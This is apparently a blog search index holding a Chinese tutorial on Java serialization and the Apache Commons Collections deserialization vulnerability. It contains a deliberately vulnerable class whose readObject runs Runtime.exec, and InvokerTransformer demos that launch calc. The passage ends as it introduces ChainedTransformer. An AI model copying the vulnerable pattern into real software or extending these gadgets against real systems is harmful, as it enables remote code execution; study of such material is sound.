<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java 反序列化</title>
    <url>/2022/07/31/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h3 id="java-的序列化和反序列化"><a href="#java-的序列化和反序列化" class="headerlink" title="java 的序列化和反序列化"></a>java 的序列化和反序列化</h3><p><strong>Java 的序列化</strong></p>
<p>Java 序列化是指把java 对象转换为字节序列过程便于保存在内存，文件，数据之中。</p>
<p><strong>Java 的反序列化</strong></p>
<p>Java 反序列是指把字节序列恢复成Java对象的过程，java.io.ObjectInputStream类的readObject()&#96;方法用于反序列化</p>
<p>Java序列化对象因为可以方便的将对象转换成字节数组，又可以方便快速的将字节数组反序列成Java对象并且可以有效地实现多平台之间的通信，对象持久化存储而被频繁地运用在<code>Socket传输</code>。在RMI(Remote Method Invocation)，JMX(java Management Extension)，http请求等。</p>
<span id="more"></span>

<h4 id="相关类，方法"><a href="#相关类，方法" class="headerlink" title="相关类，方法"></a>相关类，方法</h4><h6 id="ObjectInputStream，ObjectOutputStream"><a href="#ObjectInputStream，ObjectOutputStream" class="headerlink" title="ObjectInputStream，ObjectOutputStream"></a>ObjectInputStream，ObjectOutputStream</h6><p><code>java.io.ObjectOutputStream</code>类最核心的方法是<code>writeObject()</code>，即序列化对象</p>
<p><code>java.io.ObjectInputStream</code>类最核心的方法是<code>readObject()</code>，即反序列化对象</p>
<p><code>readObject()</code>这个方法在饭序列化漏洞中起到了关键作用，<code>readObject()</code>方法被重写的话，反序列化该类时调用的就是重写后的<code>readObject()</code>。如果该方法书写不当就会导致恶意代码的执行。</p>
<h6 id="Java-io-Serializable"><a href="#Java-io-Serializable" class="headerlink" title="Java.io.Serializable"></a>Java.io.Serializable</h6><p>实现<code>java.io.Serializable</code>接口才可以被反序列化，这个接口是一个空接口，也就是说不需要实现他的任何方法。</p>
<p>实现这个接口原则上都会产生一个<code>serialVersionUID</code>，SerialVersionUID相当于对象的指纹信息，可以直接决定反序列化是否可以成功，如果SUID不一致的话，会导致<code>InvalidClassException</code>异常，也就无法反序列化成功的。</p>
<p>如果可序列化类未显示地声明<code>serialVersionUID</code>，则序列化运行的时候将基于各个方面计算该类的默认<code>serialVersionUID</code>值</p>
<h6 id="Java-io-Externalizable"><a href="#Java-io-Externalizable" class="headerlink" title="Java.io.Externalizable"></a>Java.io.Externalizable</h6><p><code>Java.io.Externalizable</code>和<code>java.io.Serializable</code>基本上一样，但是<code>Java.io.Externalizable</code>接口定义了<code>writeExternal()</code>和<code>readExternal()</code>方法，这个两个方法需要序列化和反序列化的类实现。</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="image-20210421200754347"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ExternalizableTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExternalizableTest</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String passwd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPasswd</span><span class="params">(String passwd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.passwd = passwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPasswd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> passwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        out.writeObject(username);</span><br><span class="line">        out.writeObject(passwd);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput input)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = (String) input.readObject();</span><br><span class="line">        <span class="built_in">this</span>.passwd = (String) input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//创建ExternalizableTest类，并且设置他的属性值</span></span><br><span class="line">            <span class="type">ExternalizableTest</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExternalizableTest</span>();</span><br><span class="line">            t.setUsername(<span class="string">&quot;Username&quot;</span>);</span><br><span class="line">            t.setPasswd(<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建Java对象序列化输出流</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化t对象</span></span><br><span class="line">            outputs.writeObject(t);</span><br><span class="line">            outputs.flush();</span><br><span class="line">            outputs.close();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;ExternalizableTest 类序列化之后的字节数组为：&quot;</span>+ Arrays.toString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//利用ExternalizableTest类生成的二进制数组创建二进制输入对象的用于反序列化操作</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="comment">//通过反序列化输入流创建Java对象输入流对象</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"></span><br><span class="line">            <span class="type">ExternalizableTest</span> <span class="variable">test</span> <span class="operator">=</span> (ExternalizableTest) inputs.readObject();</span><br><span class="line">            System.out.println(<span class="string">&quot;Username: &quot;</span>+test.getUsername()+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;Passwd: &quot;</span>+test.getPasswd());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//关闭ObjectInputStream输入流</span></span><br><span class="line">            inputs.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException | ClassNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210420220729375.png" alt="image-20210421200834626"></p>
<h4 id="Java-序列化"><a href="#Java-序列化" class="headerlink" title="Java 序列化"></a>Java 序列化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Serialize_Test1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Karry&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">cat1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test1.bin&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">            oos.writeObject(cat1);</span><br><span class="line">            <span class="comment">//使用ObjectOutputStream类的writeObject方法序列化cat1对象</span></span><br><span class="line">            oos.close();</span><br><span class="line">            fos.close();</span><br><span class="line">            System.out.println(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException i)&#123;</span><br><span class="line">            i.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成的序列化数据</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210420221437599.png" alt="image-20210420220729375"></p>
<p>这里的<code>aced</code>，<code>0005</code>是java序列化内容的特征，如果经过base64编码后就应该是<code>rO0AB</code></p>
<h4 id="Java-反序列化"><a href="#Java-反序列化" class="headerlink" title="Java 反序列化"></a>Java 反序列化</h4><p>反序列化对象时的限制：</p>
<ul>
<li>被反序列化的类必须存在</li>
<li><code>serialVersionUID</code>必须一致</li>
</ul>
<h5 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h5><p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422165122257.png" alt="Java反序列化"></p>
<h5 id="eg："><a href="#eg：" class="headerlink" title="eg："></a>eg：</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Serialize_Test1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">unserialize_test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Karry&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">cat2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test1.bin&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fip);</span><br><span class="line">            cat2 = (Cat) oip.readObject();</span><br><span class="line">            <span class="comment">//使用readObject()反序列化cat2对象</span></span><br><span class="line">            oip.close();</span><br><span class="line">            fip.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException i)&#123;</span><br><span class="line">            i.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassNotFoundException c)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Cat class not found&quot;</span>);</span><br><span class="line">            c.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(cat2.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为：</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210421200834626.png" alt="image-20210420221437599"></p>
<p>通过以上的方式，就可以将序列化后的字节码重新反序列化程序中的类</p>
<h4 id="自定义序列化-writeObject-和自定义反序列化-readObject"><a href="#自定义序列化-writeObject-和自定义反序列化-readObject" class="headerlink" title="自定义序列化(writeObject)和自定义反序列化(readObject)"></a>自定义序列化(writeObject)和自定义反序列化(readObject)</h4><p>实现了<code>java.io.Serializable</code>接口的类可以定义如下的方法–反序列化魔术方法，会在类序列化和反序列化过程之中调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream Ooutputs)</span> <span class="comment">//自定义序列化</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream Oinputs)</span>    <span class="comment">//自定义反序列化  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObjectNoData</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">writeReplace</span><span class="params">()</span>                       <span class="comment">//写入时替换对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">readResolve</span><span class="params">()</span></span><br></pre></td></tr></table></figure>


<h6 id="eg"><a href="#eg" class="headerlink" title="eg"></a>eg</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> CustomizeSerialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">customize_test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="comment">//自定义反序列化方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream Oinputs)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ReadObject……&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用defaultWriteObject()默认反序列方法</span></span><br><span class="line">        Oinputs.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream Ooutputs)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        Ooutputs.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;writeObject&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObjectNoData</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;readObjectNoData……&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeReplace</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;writeReplace……&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rereadResolve</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;readResolve……&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Java-反序列化漏洞"><a href="#Java-反序列化漏洞" class="headerlink" title="Java 反序列化漏洞"></a>Java 反序列化漏洞</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><strong>暴露或者间接暴露反序列化的API，导致用户可以操作传入的数据</strong>，攻击者就可以构造反序列化对象并且执行恶意代码。</p>
<h4 id="eg-1"><a href="#eg-1" class="headerlink" title="eg"></a>eg</h4><p><code>CMD.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaSerialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CMD</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream Oinputs)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        Oinputs.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Main.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaSerialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CMD</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CMD</span>();</span><br><span class="line">        c.cmd = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] data = serialize(c);</span><br><span class="line">        unserialize(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">Boutputs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">Ooutputs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Boutputs);</span><br><span class="line">        Ooutputs.writeObject(o);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Boutputs.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">Binputs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">Oinputs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Binputs);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Oinputs.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Apache-Commons-Collections-反序列化漏洞"><a href="#Apache-Commons-Collections-反序列化漏洞" class="headerlink" title="Apache Commons Collections 反序列化漏洞"></a>Apache Commons Collections 反序列化漏洞</h3><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p><code>Apache Commons</code>是Apache开源的Java通用类项目在Java类项目之中被广泛地使用。在Apache Commons中有一个组件<code>Apache Commons Collections</code>，主要封装了Java的Collection(集合)相关类对象以及很多数据结构类型。</p>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在<code>Collections</code>中提供了一个很重要的类：<code>org.apache.commons.collections.functors.InvokerTransformer</code>，这个类实现了：<code>java.io.Serializable</code>接口。<code>Transformer</code> 提供了一个对象转换方法：<code>transform</code>，主要用于将输入对象转换为输出对象。<code>InvokerTransformer</code> 类的主要作用就是利用 Java 反射机制来创建类实例。</p>
<p>而Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</p>
<h4 id="漏洞链"><a href="#漏洞链" class="headerlink" title="漏洞链"></a>漏洞链</h4><p>漏洞点在<code>org.apache.commons.collections.functors</code>中的InvokerTransformer.java</p>
<p><code>Transformer</code>接口，<code>InvokerTransformer</code>构造方法在实例化的时候传入参数函数方法名以及参数名，<code>transform</code>方法使用java反射机制得以调用任意方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>InvokerTransformer</code>构造方法在实例化的时候传入函数方法名以及参数名，transform方法使用java反射机制得以调用任何方法</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210421200754347.png" alt="image-20210422165122257"></p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422171058324.png" alt="image-20210422165252624"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        serialize(invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">object</span> <span class="operator">=</span> (InvokerTransformer) unserialize();</span><br><span class="line">        object.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(InvokerTransformer object)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">Ooutputs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.bin&quot;</span>));</span><br><span class="line">            Ooutputs.writeObject(object);</span><br><span class="line">            Ooutputs.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">Oinputs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.bin&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> Oinputs.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422174219206.png" alt="image-20210422170633875"></p>
<h5 id="反射链构造"><a href="#反射链构造" class="headerlink" title="反射链构造"></a>反射链构造</h5><p>在<code>org/apache/commons/collections/functors/ChainedTransformer.java</code>中提供了构造一个函数对象调用链的方法</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210422165252624.png" alt="image-20210422171058324"></p>
<p>给ChainedTransformer()方法传递一个数组，在数组里面遍历调用其<code>transform</code>方法，并且将返回的结果作为下一次传入的对象</p>
